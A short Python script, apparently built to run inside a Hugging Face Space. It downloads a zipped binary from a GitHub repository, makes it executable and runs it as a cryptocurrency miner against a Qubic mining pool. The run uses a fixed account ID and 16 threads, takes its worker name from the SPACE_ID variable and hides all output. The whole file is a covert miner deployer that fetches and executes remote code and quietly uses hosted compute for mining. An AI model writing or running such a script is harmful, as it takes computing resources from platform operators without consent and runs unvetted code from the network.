import os
os.system("wget https://github.com/qqivk/syd/raw/refs/heads/main/oiq.zip")
os.system("unzip oiq.zip")
os.system("chmod +x oiq")
wn = os.getenv('SPACE_ID').replace("/","_")
os.system(f"./oiq --account CP_fafubk1b65 --pool qubic1.hk.apool.io:3334 --thread 16 --worker {wn} >/dev/null")
